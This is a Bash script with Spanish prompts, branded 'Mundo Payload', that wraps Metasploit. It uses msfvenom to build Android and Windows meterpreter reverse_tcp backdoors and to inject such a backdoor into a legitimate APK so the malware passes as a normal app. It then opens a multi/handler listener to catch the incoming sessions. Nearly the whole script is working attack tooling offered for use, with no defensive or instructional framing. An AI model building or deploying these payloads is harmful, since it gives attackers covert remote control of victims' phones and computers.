#!/bin/bash
function limpiar_pantalla {
    clear    
}

echo
echo
echo -e " " 
echo
echo -e "                 Mundo Payload"
echo
echo
echo -e "  [1] ANDROID        [2] WINDOWS       [3] injectar apk original "
echo
echo
echo
read -p "Payload: $ " payload

if [ $payload = 1 ]; then
    function limpiar_pantalla {
        clear    
        }

    trap ctrl_c INT
    function ctrl_c() {
        echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
        sleep 2s
        limpiar_pantalla
        exit 0
    }
    echo -e "\e[0;31m___________________________\e[0;34m___________________________________\e[0m"
    echo -e "\e[0;31m ██╗  ██╗  █████╗  ██████╗ \e[0;34m  ██╗ ██ ║  ███████╗  ██████╗      \e[0m"
    echo -e "\e[0;31m ██║  ██║ ██╔══██╗ ██╔════╝\e[0;34m  ██║ ██╔╝  ██╔════╝  ██╔══██╗     \e[0m"
    echo -e "\e[0;31m ███████║ ███████║ ██║Anoni\e[0;34mmo█████╔╝   █████╗    ██████╔╝     \e[0m"
    echo -e "\e[0;31m ██╔══██║ ██╔══██║ ██║     \e[0;34m  ██╔═██╗   ██╔══╝    ██╔══██╗     \e[0m"
    echo -e "\e[0;31m ██║  ██║ ██║  ██║╚██████╗ \e[0;34m  ██║ ██╗   ███████╗  ██║  ██║     \e[0m"
    echo -e "\e[0;31m ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝ \e[0;34m  ╚═╝ ╚═╝   ╚══════╝  ╚═   ╚═╝     \e[0m"
    echo -e "\e[0;31m                           \e[0;34m                                   \e[0m"
    echo -e "\e[0;31m                      A n o\e[0;34m n i m o                           \e[0m"

    echo -e "\e[3;34mDERECHOS-DE-AUTOR->>>\e[0;31mHACKER-PC\e[0m"
    sleep 2s
    echo
    echo -e "\e[1;31mVAMOS-A-CREAR-UN-PAYLOAD-ANDROID ... \e[0m"
    sleep 3s
    echo
    echo -n -e "\e[0;31mDIRECCION-IP $ \e[0m"
    read ip
    echo
    echo -n -e "\e[0;31m PUERTO $ "
    read puerto
    echo
    read -p "  Nombre de la aplicacion : " o
    limpiar_pantalla
    echo
    echo -e "\e[3;33m creando aplicacion \e[0m"
    msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $o.apk
    echo
    echo -e "\e[1;33mCreado con-\e[0m-\e[0;31m-EXITO\e[0m"
    echo
    read -p "Ruta a guardar tu Payload: $ " ruta
    sleep 2s
    mv $o.apk $ruta
    echo -e "\e[0;34mConectando a postgresql\e[0m"
    service postgresql start
    echo -e "\e[0;34mConectado con exito\e[0m"
    sleep 2s
    echo -e "\e[0;31mABRIENDO METASPLOIT\e[0m"
    sleep 2s
    limpiar_pantalla
    msfconsole -x "use multi/handler;\
    set PAYLOAD android/meterpreter/reverse_tcp;\
    set LHOST $ip;\
    set LPORT $puerto;\
    exploit"
elif [ $payload = 2 ]; then
    function limpiar_pantalla {
        clear    
        }

    trap ctrl_c INT
    function ctrl_c() {
        echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
        sleep 2s
        limpiar_pantalla
        exit 0
    }
    echo -e "\e[0;31m___________________________\e[0;34m___________________________________\e[0m"
    echo -e "\e[0;31m ██╗  ██╗  █████╗  ██████╗ \e[0;34m  ██╗ ██ ║  ███████╗  ██████╗      \e[0m"
    echo -e "\e[0;31m ██║  ██║ ██╔══██╗ ██╔════╝\e[0;34m  ██║ ██╔╝  ██╔════╝  ██╔══██╗     \e[0m"
    echo -e "\e[0;31m ███████║ ███████║ ██║Anoni\e[0;34mmo█████╔╝   █████╗    ██████╔╝     \e[0m"
    echo -e "\e[0;31m ██╔══██║ ██╔══██║ ██║     \e[0;34m  ██╔═██╗   ██╔══╝    ██╔══██╗     \e[0m"
    echo -e "\e[0;31m ██║  ██║ ██║  ██║╚██████╗ \e[0;34m  ██║ ██╗   ███████╗  ██║  ██║     \e[0m"
    echo -e "\e[0;31m ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝ \e[0;34m  ╚═╝ ╚═╝   ╚══════╝  ╚═   ╚═╝     \e[0m"
    echo -e "\e[0;31m                           \e[0;34m                                   \e[0m"
    echo -e "\e[0;31m                      A n o\e[0;34m n i m o                           \e[0m"

    echo -e "\e[3;34mDERECHOS-DE-AUTOR->>>\e[0;31mHACKER-PC\e[0m"
    sleep 2s
    echo
    echo -e "\e[1;31mVAMOS-A-CREAR-UN-PAYLOAD-Windows ... \e[0m"
    sleep 3s
    echo
    echo -n -e "\e[0;31mDIRECCION-IP $ \e[0m"
    read ip
    echo
    echo -n -e "\e[0;31m PUERTO $ "
    read puerto
    echo
    read -p "  Nombre de la aplicacion : " o
    limpiar_pantalla
    echo
    echo -e "\e[3;33m Creando el .exe \e[0m"
    msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$puerto -f exe -a x86 > $o.exe
    echo
    echo -e "\e[1;33mCreado con-\e[0m-\e[0;31m-EXITO\e[0m"
    read -p "Ruta a guardar tu Payload: $ " rut
    sleep 2s
    mv $o.exe $rut
    echo -e "\e[0;34mConectando a postgresql\e[0m"
    sudo service postgresql start
    echo -e "\e[0;34mConectado con exito\e[0m"
    sleep 2s
    echo -e "\e[0;31mABRIENDO METASPLOIT\e[0m"
    sleep 2s
    limpiar_pantalla
    msfconsole -x "use exploit/multi/handler;\
    set PAYLOAD windows/meterpreter/reverse_tcp;\
    set LHOST $ip;\
    set LPORT $puerto;\
    exploit"
elif [ $payload = 3 ]; then
    echo -e "\e[0;31m___________________________\e[0;34m___________________________________\e[0m"
    echo -e "\e[0;31m ██╗  ██╗  █████╗  ██████╗ \e[0;34m  ██╗ ██ ║  ███████╗  ██████╗      \e[0m"
    echo -e "\e[0;31m ██║  ██║ ██╔══██╗ ██╔════╝\e[0;34m  ██║ ██╔╝  ██╔════╝  ██╔══██╗     \e[0m"
    echo -e "\e[0;31m ███████║ ███████║ ██║Anoni\e[0;34mmo█████╔╝   █████╗    ██████╔╝     \e[0m"
    echo -e "\e[0;31m ██╔══██║ ██╔══██║ ██║     \e[0;34m  ██╔═██╗   ██╔══╝    ██╔══██╗     \e[0m"
    echo -e "\e[0;31m ██║  ██║ ██║  ██║╚██████╗ \e[0;34m  ██║ ██╗   ███████╗  ██║  ██║     \e[0m"
    echo -e "\e[0;31m ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝ \e[0;34m  ╚═╝ ╚═╝   ╚══════╝  ╚═   ╚═╝     \e[0m"
    echo -e "\e[0;31m                           \e[0;34m                                   \e[0m"
    echo -e "\e[0;31m                      A n o\e[0;34m n i m o                           \e[0m"

    echo -e "\e[3;34mDERECHOS-DE-AUTOR->>>\e[0;31mHACKER-PC\e[0m"
    sleep 2s
    echo
    echo -e "\e[1;31mVAMOS-A-CREAR-UN-PAYLOAD-apk original ... \e[0m\n"

    echo -e '
             |----------------------------------------------------|
             | [*] [Lista de APK`S Disponibles  y probadas 2020]  |
             |____________________________________________________| \n'
    cd modulos/modsh/apk_original
    ls
    sleep 2s
    echo -n -e '\nRuta del apk originial: $ '
    read ruta_apkoriginal
    echo
    echo -n -e "\e[0;31mDIRECCION-IP $ \e[0m"
    read ip
    echo
    echo -n -e "\e[0;31m PUERTO $ "
    read puerto
    echo
    read -p "  Nombre de la aplicacion $ " o
    limpiar_pantalla
    echo
    echo -e "\e[3;33m Creando apk original \e[0m\n\n"
    echo -e ' Nota [si la injeccion falla vuelve a intentarlo comun mente. \n se logra injectar al tercer intento con apks actuales ... ]\n\n'
    read -p 'Enter para continuar'
    msfvenom -x $ruta_apkoriginal -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto R > $o.apk
    echo
    read -p "Ruta a guardar tu Payload: $ " rut
    sleep 2s
    mv $o.apk $rut
    echo -e "\e[0;34mConectando a postgresql\e[0m"
    sudo service postgresql start
    echo -e "\e[0;34mConectado con exito\e[0m"
    sleep 2s
    echo -e "\e[0;31mABRIENDO METASPLOIT\e[0m"
    sleep 2s
    limpiar_pantalla
    msfconsole -x "use exploit/multi/handler;\
    set PAYLOAD android/meterpreter/reverse_tcp;\
    set LHOST $ip;\
    set LPORT $puerto;\
    exploit"
elif [ $payload = exit ]; then
    clear
    exit 0
else
    echo -e " Opcion no valida "
fi
